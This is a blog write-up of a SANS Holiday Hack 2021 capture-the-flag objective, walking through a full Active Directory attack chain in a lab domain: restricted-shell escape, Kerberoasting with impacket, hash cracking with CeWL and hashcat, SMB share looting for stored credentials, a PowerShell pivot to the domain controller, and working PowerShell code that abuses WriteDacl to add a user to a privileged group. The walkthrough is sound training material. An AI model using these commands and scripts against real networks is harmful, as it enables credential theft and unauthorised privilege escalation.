---
layout: post
date: 2022-01-06 08:15:26 -500
categories: jekyll update
---

# Kerberoasting on an Open Fire

**Objective**: Obtain the sleigh research document from a host on the Elf University domain. What is the first ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season?  
**Location**: ElfU Portal Link - No associated Elf  
**Hint Terminal**: [Hoho...No](/write_ups/2021_sans_hhc/term/2022-01-07-SANS-Holiday-Hack-Hoho-No)  
**Hints**:
1. Kerberoast and AD Abuse Talk - Check out [Chris Davis' talk](https://www.youtube.com/watch?v=iMh8FTzepU4) [and scripts](https://github.com/chrisjd20/hhc21_powershell_snippets) on Kerberoasting and Active Directory permissions abuse.
2. Kerberoasting and Hashcat Syntax - Leran about [Kerberoasting](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a) to leverage domain credentials to get usernames and crackable hashes for service accounts.
3. Finding Domain Controllers - There will be some `10.X.X.X` networks in your routing tables that may be interesting. Also consider adding `-PS22,445` to your `nmap` scans to "fix" default probing for unprivileged scans.
4. Hashcat Mangling Rules - [OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules) is great for mangling when a password dictionary isn't enough.
5. CeWL for Wordlist Creation - [CeWL](https://github.com/digininja/CeWL) can generate some great wordlists from websites, but it will ignore digits by default.
6. Stored Credentials - Administrators often store credentials in scripts. These can be coopted by an attacker for other purposes!
7. Active Directory Interrogation - Investigating Active Directory errors is harder without [Bloodhound](https://github.com/BloodHoundAD/BloodHound), but there are [native](https://social.technet.microsoft.com/Forums/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell) [methods](https://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

## Write Up

The talk the Chris Davis hosted is extremely helpful for this challenge. The talk should give you ideas on how and where to start, pivot, and navigate around the environment.

To start, all we are given is registration portal for [Elf University](https://register.elfu.org/). Let's make an account.

![Elfu Registration Page](/assets/img/2021_sans_hhc/obj/obj08/picture_1.PNG){: width="750"}
<p align="center"><strong>Figure 1: Elfu Registraion Landing Page</strong></p>


After creating an account, we are given a set of credentials and instructions on how to access the grading system.

![Elfu Registration Confirmation](/assets/img/2021_sans_hhc/obj/obj08/picture_2.PNG){: width="750"}
<p align="center">
    <strong>Figure 2: Elfu Registration Confirmation and Credentials</strong><br>
    Your credentials will be different.
</p>

```
ssh etucdegcur@grades.elfu.org -p 2222

ElfU Domain Username: etucdegcur
ElfU Domain Password: Bjfawoxod#
```

## The Shell

When we ssh in to the grading portal, we are immediately met with the grading applicaiton.

![Elfu Grading Shell](/assets/img/2021_sans_hhc/obj/obj08/picture_3.PNG){: width="750"}
<p align="center">
    <strong>Figure 3: Elfu Grading Service</strong>
</p>

Let's see if we can break out of the shell. Regular escape techniques won't work here, but we can try to background the program somehow with `Ctrl + <letter>`.
After a few different tries, it looks like `Ctrl+d` is the magic letter to get us to a python shell. In my case, I did 

![Python CLI](/assets/img/2021_sans_hhc/obj/obj08/picture_4.PNG){: width="750"}
<p align="center">
    <strong>Figure 4: Python Command Line Interface</strong><br>
    We've broken our of the intended grading shell. We should be able to run python commands in here now.
</p>

I'm not sure why this worked, so if anyone has any insight, please feel free to educate me!

Let's go ahead and get a bash shell using the `os` module that comes with python

```
import os
os.system("/bin/bash")
```

![Bash Shell](/assets/img/2021_sans_hhc/obj/obj08/picture_5.PNG){: width="750"}
<p align="center">
    <strong>Figure 5: Bash Shell on Grading Server</strong><br>
    We got a bash shell!
</p>

I'm in.

## Enumerate!

Once we drop in to the machine, we'll do some quality of life things (change shell and change local password) and then take some steps to figure out where we are and what our permissions looks like.

```
$ chsh --shell /bin/bash <username>
$ passwd
$ id
$ uname -a
$ sudo -l
$ ip addr
```

![Initial Foothold Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_6.PNG){: width="750"}
<p align="center">
    <strong>Figure 6: Initial Enumeration of Grade Server</strong>
</p>

With the above commands, there are a few things to note:
1. We are an unprivilieged user
2. We are on a Linux box on the `elfu.local` domain
3. We cannot run anything as a privileged user
4. The machine we are on resides in the `172.17.0.0/16`

Let's ping the domain and see what comes back

```
$ ping -c4 elfu.local
```

![Finding the Domain Controller](/assets/img/2021_sans_hhc/obj/obj08/picture_7.PNG){: width="750"}
<p align="center">
    <strong>Figure 7: Domain Controller Found</strong>
</p>

Immediately we can see that there is another domain that is internal to this one
```
Domain: holidayhack2021.internal
IP: 10.128.1.53
```

Since we know that we will have to conduct some kind of Active Directory attack, let's use [impacket's `GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) as detailed in the talk.

We need to upload this script to the box we are currently on. We'll use SCP since we know we have access to the machine with our unprivileged user account.

Download the script to your local machine, browse to the download location and then upload the file.

```
scp -P 2222 GetUserSPNs.py <username>@grades.elfu.org:/home/<username>/
```

The file should land in your home directory. Change the permissions and run it.

```
chmod +x GetUserSPNs.py
python3 GetUserSPNs.py -dc-ip 10.128.1.53 elfu.local/<username>:<domain password> -request
```

Looks like we found a vulnerable account, `elfu_svc`!

![Kerberoasting the elfu_svc Account](/assets/img/2021_sans_hhc/obj/obj08/picture_8.PNG){: width="750"}
<p align="center">
    <strong>Figure 8: Service Account Vulnerable to Kerberoasting</strong>
</p>

```
$krb5tgs$23$*elfu_svc$ELFU.LOCAL$elfu.local/elfu_svc*$aba9cc937c957875d486462b35494ba8$dad3e65c66a
8a30e78a60c77713bbd6721e95c671d7a5164804f52a965068fb4800473aab17c97a6651693d609ebf07285a7770d67059
598c74953358c124cb01cbd39f2837d9f4a5635641257b879aac35111b2c85e39e2fa17433f5d4fe49346a905c386a7df3
411f91250129f2f0d367ede051162041b33ea24ccc27cfed485683d2f879b6f3eccf1a0855bda9989150611e17dab1ba22
1bc360a598155b6a7ba8504d68c9eafba5306ee3c32b6fe6cf548cfaa803e0954f411568170992eaeafc44684574faad48
12bda73f31e776d39797a518d973c86ac3a04c53c8042ad9911e7586c785f9e86228ed355a065c1816174ef81e889249c4
ef833955eed1931ad94bdec2532eb4be17ed3af0d725d7944274d126ed89423c33339057e1b7ea8408c96cb6b2fe90d14f
c34269fb637ab51646a93b02a88fead678091675807ef4e35ea6f678ccad0f09bc53108c28643b1ad375b0cf0bf8f7e0fe
fa5155b5c06e45d6b47409982ef023270f7d09f35cfaa9c943d4f9afb1f4fbde7e5cb1be607ba339000e21808553f5dbe9
8cc463c0b20665505e740b2db7ee2ef0d7f3010065434f27b72b498f20bccc3cdae5d84828c9d90e79ba7fbce3df1e52cc
35c5aca6965ece0953320a4682877695449d22894b1c3a4fb5ed6e99fe08a1ddb787a7c7eeef4cd4689eda2d7b45dfd46d
d3d49e6718c0af56be545ef7a19059c39829774045357eb1f1c6901fef60a30dca924da70dc785998be036a0ab6a5c0b82
e7043ec3ed5995340ed048d07a8f64ce20bf94a99d6c912ed5db5589da735f2fb6d8c7d498991529a459247b0ed7350160
6f886b0e8560161727d08e1fb55c192f8053d7a6bbfd092f28abc5d894b9fdbf4587582db3e5fe0e3640e40cf32a59106b
58c47c5e12c7e9de989b40dc95af9a52d514ef4bc2064d9c5edf53685cf92ad845b422b5712d07ccf8bd3c9e61f4144e0b
c6329719cb78dc2ce02558b4e8af4fdfd4f580d543c42126070a2367b81fc7b15908a17da901ccfbd284c8c2ebc45da406
2ab921da93e3556c92e57cb935c0d062a978aa234a71d51378b2f1bf5bc679f54679c4ac40eb394e25818f8d5058fd4d00
045555fbbaa962a8253535f7360318afefa3b7c08c9029e1f7e4020b8f7be1a4914c1be1d9beff4d5da4c2432506817fd9
0548a73e18eb7d8dbe14f7e3d398333cc99786a8eb8575e7b1660b54bd7d2adf821570ab88fe7651c4d05758112d38adca
ad7b95202da28295b6cf5561a3e5cecdd6e50181f5f5b9fd2a3f017ef36013c56f0db7157b1b77c58d22b6830dc9854007
fccaf06475bbf85f8efb6d9f69dcd0d0e80abcc715055c063bc2c1c729fab6e84589f8ceab7399093637fae344bac363fd
5933b310910d3d4b4dd1420f8899a197e492b00010a8d6e0d13436d18b4625498a7cf6168313dde4c217eac
```

Make sure to put this hash in a text file. This will make the cracking process simpler.

## Crack the Hash

Hints 4 and 5 help a lot to crack this hash.

The first thing that we need to do is generate our wordlist. We'll use CeWL for this.

Hint 5 indicates that we should probably include digits when scraping the website, so knowing that, let's construct our command

```
cewl -o https://register.elfu.org -w wordlist.txt --with-numbers
```

This will put the word list in to `wordlist.txt`

This is the list we will use to crack the hash for the `elfu_svc` account we enumerated.

We'll use the rule set defined in hint 4 to mangle the words in the wordlist we just generated.

Let's get to crackin'! 

```
hashcat -a 0 -m 13100 crackMe.txt --potfile-disable -r /usr/share/hashcat/rules/
password_cracking_rules/OneRuleToRuleThemAll.rule --force -O -w 4 ./wordlist.txt
```
![elfu_svc Credentials](/assets/img/2021_sans_hhc/obj/obj08/picture_9.PNG){: width="750"}
<p align="center">
    <strong>Figure 9: Cracked Credentials for the <em>elfu_svc</em> Account</strong>
</p>

Looks like we were able to crack the hash!

```
Username: elfu_svc
Password: Snow2021!
```

## Enumerate...again!

Now we need to figure out what to do with these credentials.

Let's see what other hosts are around us in this subnet. We can do this by creating a quick ping script using bash. We'll just ping the `172.17.0.0/24` subnet, since that is significantly fewer hosts, and work from there.

```
for i in {1..254}; do (ping -c1 172.17.0.$i | grep "bytes from" &); done
```

![Network Ping Sweep](/assets/img/2021_sans_hhc/obj/obj08/picture_10.PNG){: width="750"}
<p align="center">
    <strong>Figure 10: Host Enumeration</strong>
</p>

It appears that there are 5 hosts that are up

```
172.17.0.1
172.17.0.2
172.17.0.3
172.17.0.4
172.17.0.5
```

Let's do a port scan on all of these hosts and see what we find.

First, let's see if nmap is on the host. `which nmap` shows that `nmap` is installed and is located in `/usr/bin/nmap`

Let's fingerprint the 5 hosts we found.

```
nmap -sV -p- -Pn 172.17.0.1,2,3,4,5

# -sV : tells nmap to enumerate the services on the ports that it finds
# -p- : tells nmap to scan all ports, instead of the top 1000 ports
# -Pn : disables ping to check if the host is alive. 
#       We already know that they are up with our initial ping sweep
```

![Service Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_11.PNG){: width="750"}
<p align="center">
    <strong>Figure 11: Service Scan of Discovered Hosts</strong>
</p>

Hosts `172.17.0.3`, `172.17.0.4`, and `172.17.0.5` look like they may have SMB shares that we can check out. 

Using `smbclient` we can try to list the shares for each of the hosts.

```
smbclient -L \\172.17.0.3
smbclient -L \\172.17.0.4
smbclient -L \\172.17.0.5
```

![SMB Share Enumeration](/assets/img/2021_sans_hhc/obj/obj08/picture_12.PNG){: width="750"}
<p align="center">
    <strong>Figure 12: Enumerated Shares of Hosts <em>172.17.0.3</em>, <em>172.17.0.4</em>, and <em>172.17.0.5</em></strong>
</p>

Host `172.17.0.4` looks like it hosts some interesting things (it should be noted that the target host with the necessary shares may changed. When I first solved this challenge, the host with the relevant shares was `172.17.0.3`). We need to access the `research_dep` in order to get the file we are looking for. Additionally, it looks like there is a share specifically for the `elfu_svc` account: `elfu_svc_shr`. This share may hold some information that will allow us to pivot deeper in to the network.

But before we go treasure hunting, let's see if the `elfu_svc` account has access to the `research_dep` share.

```
smbclient \\\\172.17.0.4\\research_dep -U elfu_svc
```

![Attempted Access of Target Directory](/assets/img/2021_sans_hhc/obj/obj08/picture_13.PNG){: width="750"}
<p align="center">
    <strong>Figure 13: Attempt to Access Research Share</strong>
</p>

No luck here, so I guess we gotta jump in to the other share.

```
smbclient \\\\172.17.0.4\\elfu_svc_shr -U elfu_svc
```

Success! It looks like we have access to the share and there are a ton of scripts that live on this share. Taking hint 6, let's see if we can find some stored credentials.

![Attempted Access of Service Share](/assets/img/2021_sans_hhc/obj/obj08/picture_14.PNG){: width="750"}
<p align="center">
    <strong>Figure 14: Successful Access of Service Share</strong>
</p>

Let's copy all of these scripts to the grading host, and then grep through them.

```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

![File Exfiltration](/assets/img/2021_sans_hhc/obj/obj08/picture_15.PNG){: width="750"}
<p align="center">
    <strong>Figure 15: Exfiltration of Scripts from Service Share</strong>
</p>

Since this is `elfu`, let's grep for the keyword `elf` in all the files

```
grep --ignore-case elf *
```

![Keyword Search for Stored Credentials](/assets/img/2021_sans_hhc/obj/obj08/picture_16.PNG){: width="750"}
<p align="center">
    <strong>Figure 16: Enumeration of Stored Credentials from Service Share Scripts</strong>
</p>

The second entry, `GetProcessInfo.ps1`, looks like it has an account of interest, as well as some stored credentials that we could possible work with.

![](/assets/img/2021_sans_hhc/obj/obj08/picture_17.PNG){: width="750"}
<p align="center">
    <strong>Figure 17: Stored Credentials of <em>remote_elf</em> Account</strong>
</p>

Just as suspected, the script stores a variable that holds the password, and then passes the variable as well as the username as a credential in order to access `10.128.1.53`. This also means that `10.128.1.53` is likely of high interest to us.

## Pivot

With our new found credentials, we can enter a `powershell` commandline prompt on the grading host and pivot in to `10.128.1.53`.

Luckily, the grading host has `powershell` installed on it

![Powershell](/assets/img/2021_sans_hhc/obj/obj08/picture_18.PNG){: width="750"}
<p align="center">
    <strong>Figure 18: Powershell Exists on the Grading Server</strong><br>
    We can use this fact to our advantage and run powershell commands in a hybrid domain environment
</p>

We can store the credentials in a variable in this shell just like the script does by copying and pasting the first three lines of the script in to the powershell prompt we have invoked

![Storing Enumerating Credentials as Variables in Powershell](/assets/img/2021_sans_hhc/obj/obj08/picture_19.PNG){: width="750"}
<p align="center">
    <strong>Figure 18: Storing Enumerated Credentials as Variables in Powershell</strong>
</p>

And then we can generate a remote session with the `10.128.1.53` machine

```
PS > Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
```

And we're are in what appears to be `DC01`!

![Successful Pivot on to Domain Controller](/assets/img/2021_sans_hhc/obj/obj08/picture_20.PNG){: width="750"}
<p align="center">
    <strong>Figure 20: Successful Pivot on to Domain Controller</strong>
</p>

## Enumerate...Once Again!

So the goal of the challenge is to retrieve a research file. Presumably, there is a research group in this domain that we can add our unprivileged user account to.

Running `Get-ADGroup -Filter *`, we see that there is in fact a research group named `Research Department`

![Enumeration of the Research Department Group](/assets/img/2021_sans_hhc/obj/obj08/picture_21.PNG){: width="750"}
<p align="center">
    <strong>Figure 21: Enumeration of the <em>Research Department</em> Group</strong>
</p>

The next thing we need to check is to see if our current user has WriteDacl permissions for the `Research Department Group`.

We can verify this using the following lines from Chris Davis' KringleCon talk:

```
PS > $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
PS > $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
PS > $domainDirEntry.get_ObjectSecurity().Access
```

This will push out who has permissions to what in the group.

Scrolling up a bit, we can see that `remote_elf` has WriteDacl permissions to this group. This means we can add our unprivileged user account to the group to access the `research_dep` share!

![*remote_elf* WriteDacl Permissions to Research Department](/assets/img/2021_sans_hhc/obj/obj08/picture_22.PNG){: width="750"}
<p align="center">
    <strong>Figure 21: <em>remote_elf WriteDacl</em> Permissions to <em>Research Department</em> Group</strong>
</p>

## Escalate

Using the information found in the previous section as well as the code snippets provided by Chris Davis, let's add our unprivileged user account to the `Research Department` group.

```
Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$username = "etucdegcur"
$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (
	New-Object System.Security.Principal.NTAccount("elfu.local\$username")).
    Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
	$IdentityReference,
	([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"),
	([System.Security.AccessControl.AccessControlType] "Allow"),
	$propGUID, $inheritanceType, $nullGUID
	)
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()

Add-Type -AssemblyName System.DirectoryServices
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,dc=local"
$username = "etucdegcur"
$password = "Bjfawoxod#"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, 
    $password
$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
$b = New-Object byte[] $sid.BinaryLength
$sid.GetBinaryForm($b,0)
$hexSID = [BitConverter]::ToString($b).Replace('-','')
$domainDirEntry.Add("LDAP://<SID=$hexSID>")
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
```

Verify that we are in the group now...

```
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$domainDirEntry.get_ObjectSecurity().Access

Alternatively
Get-ADPrincipalGroupMembership etucdegcur | select name
```

And now we should have access to the share!

![Unprivileged User is Now a Member of the Research Department](/assets/img/2021_sans_hhc/obj/obj08/picture_23.PNG){: width="750"}
<p align="center">
    <strong>Figure 23: Unprivileged user is Now a Member of the <em>Research Department</em></strong>
</p>

## Exfiltrate

Now that we are added to the `Research Department` group, let's try to access the `research_dep` share with our unprivileged user account.

![Successful Access to Research Share](/assets/img/2021_sans_hhc/obj/obj08/picture_24.png){: width="750"}
<p align="center">
    <strong>Figure 24: Successful Access to Research Share</strong>
</p>

Success!

Pull the file with `mget *`

After we get the file to the grading server, we'll have to pull it to our local host. We can do that with SCP.

```
scp -P 2222 . etucdegcur@grades.elfu.org:~/SantaSecretToAWonderfulHolidaySeason.pdf .
```

It looks like the first ingredient it `Kindness`!

![Target Document](/assets/img/2021_sans_hhc/obj/obj08/picture_25.PNG){: width="750"}
<p align="center">
    <strong>Figure 25: Santa's Recipe to a Wonderful Holiday Season</strong>
</p>

---
<p align="center"><a href="/write_ups/2021_sans_hhc/obj/2022-01-06-SANS-Holiday-Hack-Objective-7">< Objective 7</a> :: <a href="/write_ups/2021_sans_hhc/obj/2022-01-06-SANS-Holiday-Hack-Objective-9">Objective 9 ></a></p>